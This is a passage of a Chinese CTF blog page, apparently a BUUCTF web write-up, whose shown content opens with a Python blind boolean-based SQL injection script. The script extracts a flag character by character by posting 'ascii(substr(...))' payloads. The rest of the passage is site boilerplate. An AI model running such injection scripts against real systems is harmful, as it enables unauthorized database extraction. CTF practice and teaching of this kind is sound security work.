+num = 0  # 用了来判断是不是flag已经拼完整了
+for i in range(1, 60):
+
+    if num == 1:
+        break
+
+    for j in range(32, 128):
+
+        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)" % (i, j)
+        # print(str((i-1)*96+j-32)+":~"+payload+"~")
+
+        data = {
+            "id": payload,
+        }
+
+        r = requests.post(url, data=data)
+
+        r.encoding = r.apparent_encoding
+
+        if "Hello" in r.text:
+            x = chr(j)
+            result += str(x)
+            print(result)
+            break
+
+        if "}" in result:
+            print(result)
+            num = 1
+            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">southerose</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://southerose.gitee.io/2021/07/10/buuctf-web-wp/">http://southerose.gitee.io/2021/07/10/buuctf-web-wp/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">southerose</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/buuctf/">
+                                    <span class="chip bg-color">buuctf</span>
+                                </a>
+                            
+                                <a href="/tags/wp/">
+                                    <span class="chip bg-color">wp</span>
+                                </a>
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2021/07/10/buuctf-web-wp/">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20211116173634.png" class="responsive-img" alt="buuctf-web-wp">
+                        
+                        <span class="card-title">buuctf-web-wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/buuctf/">
+                        <span class="chip bg-color">buuctf</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/06/20/buuctf-misc-wp/">
+                    <div class="card-image">
+                        
+                        <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620102558.png" class="responsive-img" alt="buuctf-misc-wp">
+                        
+                        <span class="card-title">buuctf-misc-wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/buuctf/">
+                        <span class="chip bg-color">buuctf</span>
+                    </a>
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
+                    </a>
+                    
+                    <a href="/tags/wp/">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1,h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1,h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2021</span>
+            
+            <span id="year">2021</span>
+            <a href="/about" target="_blank">southerose</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">19.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2021";
+                    var startMonth = "3";
+                    var startDate = "31";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/southerose" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1374900749@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1374900749" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1374900749" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
